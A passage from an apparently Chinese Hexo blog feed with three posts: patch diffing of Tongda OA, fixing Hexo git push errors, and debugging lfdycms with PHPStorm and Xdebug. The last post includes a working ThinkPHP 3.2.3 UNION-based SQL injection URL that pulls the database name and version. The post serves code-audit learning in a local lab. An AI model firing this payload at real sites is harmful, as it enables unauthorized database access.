v11.3，然后将安装目录中的webroot文件夹copy到外面作为未patch的版本。随后安装通达OA补丁，再将安装过补丁后的webroot文件夹copy到外面作为patch过的版本。随便点开一个文件可见是Zend加密过的PHP代码，我们需要对其进行解密：</p><p><img src="/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/1.png" alt></p><p>使用SeayDzend解密加密过的代码，文件比较多等待时间会比较长：</p><p><img src="/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/2.png" alt></p><p>使用DiffMerge对比打了Patch前后产生变化的代码文件，然后不断跟进看是否是漏洞相关的代码：</p><p><img src="/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/3.png" alt></p><blockquote><p>DiffMerge打开文件时候会因为中文而有编码问题。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1DAY挖掘经验之通达OAPatch分析&quot;&gt;&lt;a href=&quot;#1DAY挖掘经验之通达OAPatch分析&quot; class=&quot;headerlink&quot; title=&quot;1DAY挖掘经验之通达OAPatch分析&quot;&gt;&lt;/a&gt;1DAY挖掘经验之通达OAPatch分析&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo报错</title>
    <link href="http://bai-ren-1.github.io/2021/06/08/Hexo%E6%8A%A5%E9%94%99/"/>
    <id>http://bai-ren-1.github.io/2021/06/08/Hexo%E6%8A%A5%E9%94%99/</id>
    <published>2021-06-08T05:56:52.000Z</published>
    <updated>2021-06-08T06:02:05.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo报错"><a href="#Hexo报错" class="headerlink" title="Hexo报错"></a>Hexo报错</h1><h2 id="0x00-Unknown-SSL-protocol-error"><a href="#0x00-Unknown-SSL-protocol-error" class="headerlink" title="0x00 Unknown SSL protocol error"></a>0x00 Unknown SSL protocol error</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: unable to access &apos;https://github.com/bai-ren-1/bai-ren-1.github.io.git/&apos;:        Unknown SSL protocol error in connection to github.com:443</span><br></pre></td></tr></table></figure><p>参考网上文章然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy </span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure><h2 id="0x01-Failed-to-connect"><a href="#0x01-Failed-to-connect" class="headerlink" title="0x01 Failed to connect"></a>0x01 Failed to connect</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: unable to access &apos;https://github.com/bai-ren-1/bai-ren-1.github.io.git/&apos;: Failed to connect to github.com port 443: Timed out</span><br></pre></td></tr></table></figure><p>看起来就是连接问题，直接加个代理。找到用户目录下的.gitconfig文件，添加代理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[http]</span><br><span class="line">proxy = 127.0.0.1:1080/</span><br></pre></td></tr></table></figure><p>重新push即可成功</p><h2 id="0x02-展望"><a href="#0x02-展望" class="headerlink" title="0x02 展望"></a>0x02 展望</h2><p>以后还有其他坑再补齐。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Hexo报错&quot;&gt;&lt;a href=&quot;#Hexo报错&quot; class=&quot;headerlink&quot; title=&quot;Hexo报错&quot;&gt;&lt;/a&gt;Hexo报错&lt;/h1&gt;&lt;h2 id=&quot;0x00-Unknown-SSL-protocol-error&quot;&gt;&lt;a href=&quot;#0x00-U
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>PHPStorm结合Wampserver调试</title>
    <link href="http://bai-ren-1.github.io/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/"/>
    <id>http://bai-ren-1.github.io/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/</id>
    <published>2021-06-08T02:21:45.000Z</published>
    <updated>2021-06-08T05:45:00.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHPStorm结合Wampserver调试"><a href="#PHPStorm结合Wampserver调试" class="headerlink" title="PHPStorm结合Wampserver调试"></a>PHPStorm结合Wampserver调试</h1><p>记录一下如何使用PHPStorm和Wampserver结合来调试代码，便于审计。</p><h2 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00 环境配置"></a>0x00 环境配置</h2><ul><li>PHPStorm v.2018.3.5</li><li>Wampserver v.3.2.3</li><li>Xdebug helper v.1.6.1</li></ul><h2 id="0x01-配置过程"><a href="#0x01-配置过程" class="headerlink" title="0x01 配置过程"></a>0x01 配置过程</h2><h3 id="00-CMS搭建"><a href="#00-CMS搭建" class="headerlink" title="00 CMS搭建"></a>00 CMS搭建</h3><p>这部分没什么好说的，选择lfdycms作为我的cms选择。直接拉到www目录下面，添加虚拟地址方便访问：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/1.png" alt></p><p>上面画绿框的ServerName就是我添加的虚拟地址，这样访问<a href="http://www.lfdycms.com就能访问到本地搭建的环境。" target="_blank" rel="noopener">www.lfdycms.com就能访问到本地搭建的环境。</a></p><h3 id="01-Wampserver配置"><a href="#01-Wampserver配置" class="headerlink" title="01 Wampserver配置"></a>01 Wampserver配置</h3><p>Wampserver里面是自动集成了Xdebug插件，我们可以在php.ini文件中开启并进行配置：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/2.png" alt></p><p>把enable设置为1开启，并在下面添加一些配置信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xdebug.idekey=PhpStorm  </span><br><span class="line">xdebug.remote_enable = On  </span><br><span class="line">xdebug.remote_host=localhost  </span><br><span class="line">xdebug.remote_port=9000  </span><br><span class="line">xdebug.remote_handler=dbgp</span><br></pre></td></tr></table></figure><p>添加信息后重启Wampserver让配置信息生效。重启后可以到localhost下查看phpinfo确认是否开启了Xdebug：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/3.png" alt></p><h3 id="02-PHPStorm配置"><a href="#02-PHPStorm配置" class="headerlink" title="02 PHPStorm配置"></a>02 PHPStorm配置</h3><p>首先选择File-&gt;Settings-&gt;Languages&amp;Frame Works-&gt;Php-&gt;Servers，配置服务器信息：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/4.png" alt></p><p>其次选择 File-&gt;Settings-&gt;Languages&amp;Frame Works-&gt;Php-&gt;Debug-&gt;DBGp Proxy 配置代理信息：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/5.png" alt></p><p>最后选择 File-&gt;Settings-&gt;Languages&amp;Frame Works-&gt;Php-Debug 找到右边窗口对应的debug设置，把端口改成9000，配置内容如下图所示： </p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/6.png" alt></p><h2 id="0x02-调试过程"><a href="#0x02-调试过程" class="headerlink" title="0x02 调试过程"></a>0x02 调试过程</h2><h3 id="00-开启Xdebug-helper"><a href="#00-开启Xdebug-helper" class="headerlink" title="00 开启Xdebug helper"></a>00 开启Xdebug helper</h3><p>首先点击Xdebug helper右上角的小虫子的Debug开启Debug功能：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/7.png" alt></p><h3 id="01-代码断点"><a href="#01-代码断点" class="headerlink" title="01 代码断点"></a>01 代码断点</h3><p>打开www目录中的源代码，随便下一个断点：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/8.png" alt></p><p>然后点击右上角的Debug开关，然后运行Debug功能：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/9.png" alt></p><p>访问服务器网站，代码运行到断点位置：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/10.png" alt></p><h2 id="0x03-调试lfdycms"><a href="#0x03-调试lfdycms" class="headerlink" title="0x03 调试lfdycms"></a>0x03 调试lfdycms</h2><p>lfdycms框架基于ThinkPHP 3.2.3开发，而ThinkPHP 3.2.3中find等方法存在SQL注入漏洞：<a href="https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/#toc-heading-4，因此，可以寻找lfdycms中调用了find方法来挖掘SQL注入漏洞。通过访问下面url触发MovieController中的方法：" target="_blank" rel="noopener">https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/#toc-heading-4，因此，可以寻找lfdycms中调用了find方法来挖掘SQL注入漏洞。通过访问下面url触发MovieController中的方法：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php/Home/Movie/index/?id[where]=0%20union%20select%201,2,database(),(select%20%20version()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%20-</span><br></pre></td></tr></table></figure><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/11.png" alt></p><p>可以看到id就是我们的GET参数，其值是由我们控制的注入payload，往下跟进进入detail看如何处理id变量：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/12.png" alt></p><p>可见在MovieModel中是通过ThinkPHP的find方法进行SQL查询，故存在SQL注入漏洞。</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/13.png" alt></p><p>把代码流程走完即可模板生成后即可在浏览器看到回显的数据：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/14.png" alt></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>记录进步。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHPStorm结合Wampserver调试&quot;&gt;&lt;a href=&quot;#PHPStorm结合Wampserver调试&quot; class=&quot;headerlink&quot; title=&quot;PHPStorm结合Wampserver调试&quot;&gt;&lt;/a&gt;PHPStorm结合Wampserver
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
